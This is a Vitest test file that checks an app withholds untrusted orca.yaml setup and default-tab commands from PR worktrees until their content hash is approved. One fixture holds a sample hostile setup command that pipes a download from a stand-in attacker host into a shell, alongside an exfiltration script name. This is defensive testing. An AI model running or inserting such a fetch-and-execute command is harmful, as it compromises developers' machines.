import { beforeEach, describe, expect, it, vi } from 'vitest'
import {
  listWorktreesMock,
  createSetupRunnerScriptMock,
  getDefaultTabsLaunchMock,
  getEffectiveHooksFromConfigMock,
  loadHooksMock,
  shouldRunSetupForCreateMock
} from './worktrees-test-module-mocks'
import { handlers, setupWorktreeHandlers, store } from './worktrees-test-harness'
import { createdWorktreeList } from './worktrees-test-fixtures'
import { getOrcaSetupTrustContent, hashOrcaHookScriptContent } from '../../shared/orca-hook-trust'
import type { OrcaHooks } from '../../shared/orca-yaml-hook-types'

vi.mock('electron', async () =>
  (await import('./worktrees-test-module-mocks')).electronModuleMock()
)
vi.mock('../git/worktree', async () =>
  (await import('./worktrees-test-module-mocks')).gitWorktreeModuleMock()
)
vi.mock('../git/runner', async () =>
  (await import('./worktrees-test-module-mocks')).gitRunnerModuleMock()
)
vi.mock('../git/repo', async () =>
  (await import('./worktrees-test-module-mocks')).gitRepoModuleMock()
)
vi.mock('../git/git-username', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  resolveLocalGitUsername: (await import('./worktrees-test-module-mocks'))
    .resolveLocalGitUsernameMock
}))
vi.mock('../github/client', async () =>
  (await import('./worktrees-test-module-mocks')).githubClientModuleMock()
)
vi.mock('../source-control/hosted-review', async () =>
  (await import('./worktrees-test-module-mocks')).hostedReviewModuleMock()
)
vi.mock('../providers/ssh-git-dispatch', async () =>
  (await import('./worktrees-test-module-mocks')).sshGitDispatchModuleMock()
)
vi.mock('../providers/ssh-filesystem-dispatch', async () =>
  (await import('./worktrees-test-module-mocks')).sshFilesystemDispatchModuleMock()
)
vi.mock('./worktree-symlinks', async () =>
  (await import('./worktrees-test-module-mocks')).worktreeSymlinksModuleMock()
)
vi.mock('./ssh', async () => (await import('./worktrees-test-module-mocks')).sshModuleMock())
vi.mock('../ssh/ssh-target-registry', async () =>
  (await import('./worktrees-test-module-mocks')).sshTargetRegistryModuleMock()
)
vi.mock('../hooks', async () => (await import('./worktrees-test-module-mocks')).hooksModuleMock())
vi.mock('../setup-runner-script-text', async (importOriginal) =>
  (await import('./worktrees-test-module-mocks')).setupRunnerScriptTextModuleMock(
    (await importOriginal()) as Record<string, unknown>
  )
)
vi.mock('../worktree-runner-script', async (importOriginal) =>
  (await import('./worktrees-test-module-mocks')).worktreeRunnerScriptModuleMock(
    (await importOriginal()) as Record<string, unknown>
  )
)
vi.mock('../effective-hook-config', async (importOriginal) =>
  (await import('./worktrees-test-module-mocks')).effectiveHookConfigModuleMock(
    (await importOriginal()) as Record<string, unknown>
  )
)
vi.mock('../setup-hook-env-vars', async (importOriginal) =>
  (await import('./worktrees-test-module-mocks')).setupHookEnvVarsModuleMock(
    (await importOriginal()) as Record<string, unknown>
  )
)
vi.mock('./worktree-logic', async (importOriginal) =>
  (await import('./worktrees-test-module-mocks')).worktreeLogicModuleMock(
    (await importOriginal()) as Record<string, unknown>
  )
)
vi.mock('../terminal-history-deletion', async () =>
  (await import('./worktrees-test-module-mocks')).terminalHistoryDeletionModuleMock()
)
vi.mock('../ports/advertised-url-watcher', async () =>
  (await import('./worktrees-test-module-mocks')).advertisedUrlWatcherModuleMock()
)
vi.mock('../workspace-cleanup-scan-snapshot', async () =>
  (await import('./worktrees-test-module-mocks')).workspaceCleanupScanSnapshotModuleMock()
)
vi.mock('../workspace-space-analysis-snapshot', async () =>
  (await import('./worktrees-test-module-mocks')).workspaceSpaceAnalysisSnapshotModuleMock()
)
vi.mock('../workspace-cleanup-removal-snapshot-prune', async () =>
  (await import('./worktrees-test-module-mocks')).workspaceCleanupRemovalSnapshotPruneModuleMock()
)
vi.mock('../runtime/worktree-teardown', async () =>
  (await import('./worktrees-test-module-mocks')).worktreeTeardownModuleMock()
)
vi.mock('./pty', async () => (await import('./worktrees-test-module-mocks')).ptyModuleMock())

// Attack shape: a PR branch adds orca.yaml commands the primary checkout never had.
const worktreeHooks: OrcaHooks = {
  scripts: { setup: 'curl https://attacker.example/x | sh' },
  defaultTabs: [{ title: 'Server', command: 'node exfiltrate.js' }]
}
const worktreeTrustContent = getOrcaSetupTrustContent(worktreeHooks)

function arrangeWorktreeWithSetup(): void {
  listWorktreesMock.mockResolvedValue(createdWorktreeList)
  loadHooksMock.mockImplementation((path) =>
    path === '/workspace/improve-dashboard' ? worktreeHooks : null
  )
  getEffectiveHooksFromConfigMock.mockImplementation((_repo, hooks) =>
    hooks === worktreeHooks ? { scripts: { setup: worktreeHooks.scripts.setup } } : null
  )
  getDefaultTabsLaunchMock.mockImplementation((hooks) =>
    hooks === worktreeHooks ? { tabs: worktreeHooks.defaultTabs, runCommands: true } : undefined
  )
  // Default 'run-by-default' policy with no explicit decision.
  shouldRunSetupForCreateMock.mockReturnValue(true)
}

describe('worktrees:create orca.yaml setup trust', () => {
  beforeEach(() => {
    setupWorktreeHandlers()
    store.getUI.mockReset()
    arrangeWorktreeWithSetup()
  })

  it('withholds untrusted worktree setup and defaultTabs commands and returns them for approval', async () => {
    store.getUI.mockReturnValue({ trustedOrcaHooks: {} })

    const result = (await handlers['worktrees:create'](null, {
      repoId: 'repo-1',
      name: 'improve-dashboard'
    })) as Record<string, unknown>

    expect(result.setup).toBeUndefined()
    expect(result.defaultTabs).toEqual({ tabs: worktreeHooks.defaultTabs, runCommands: false })
    expect(result.setupApproval).toEqual({
      scriptContent: worktreeTrustContent,
      contentHash: hashOrcaHookScriptContent(worktreeTrustContent),
      setup: expect.objectContaining({
        runnerScriptPath: '/workspace/repo/.git/orca/setup-runner.sh'
      }),
      runDefaultTabCommands: true
    })
  })

  it('withholds worktree content even when the primary checkout content was approved', async () => {
    store.getUI.mockReturnValue({
      trustedOrcaHooks: {
        'repo-1': {
          setup: { contentHash: hashOrcaHookScriptContent('pnpm install'), approvedAt: 1 }
        }
      }
    })

    const result = (await handlers['worktrees:create'](null, {
      repoId: 'repo-1',
      name: 'improve-dashboard',
      setupDecision: 'run',
      setupTrust: { contentHash: hashOrcaHookScriptContent('pnpm install') }
    })) as Record<string, unknown>

    expect(result.setup).toBeUndefined()
    expect(result.setupApproval).toMatchObject({ scriptContent: worktreeTrustContent })
  })

  it('launches setup when the stored hash matches the worktree content', async () => {
    store.getUI.mockReturnValue({
      trustedOrcaHooks: {
        'repo-1': {
          setup: { contentHash: hashOrcaHookScriptContent(worktreeTrustContent), approvedAt: 1 }
        }
      }
    })

    const result = (await handlers['worktrees:create'](null, {
      repoId: 'repo-1',
      name: 'improve-dashboard'
    })) as Record<string, unknown>

    expect(result.setup).toMatchObject({
      runnerScriptPath: '/workspace/repo/.git/orca/setup-runner.sh'
    })
    expect(result.defaultTabs).toEqual({ tabs: worktreeHooks.defaultTabs, runCommands: true })
    expect(result.setupApproval).toBeUndefined()
  })

  it('launches setup when the creating client granted the worktree content hash', async () => {
    const result = (await handlers['worktrees:create'](null, {
      repoId: 'repo-1',
      name: 'improve-dashboard',
      setupTrust: { contentHash: hashOrcaHookScriptContent(worktreeTrustContent) }
    })) as Record<string, unknown>

    expect(result.setup).toBeDefined()
    expect(result.setupApproval).toBeUndefined()
  })

  it('launches setup under repo-wide trust', async () => {
    store.getUI.mockReturnValue({ trustedOrcaHooks: { 'repo-1': { all: { approvedAt: 1 } } } })

    const result = (await handlers['worktrees:create'](null, {
      repoId: 'repo-1',
      name: 'improve-dashboard'
    })) as Record<string, unknown>

    expect(result.setup).toBeDefined()
    expect(result.setupApproval).toBeUndefined()
  })

  it('launches setup for an explicit CLI --setup run', async () => {
    const result = (await handlers['worktrees:create'](null, {
      repoId: 'repo-1',
      name: 'improve-dashboard',
      setupDecision: 'run',
      cliProvenance: { kind: 'created-by-cli', createdAt: 1 }
    })) as Record<string, unknown>

    expect(result.setup).toBeDefined()
    expect(result.setupApproval).toBeUndefined()
    expect(createSetupRunnerScriptMock).toHaveBeenCalled()
  })
})
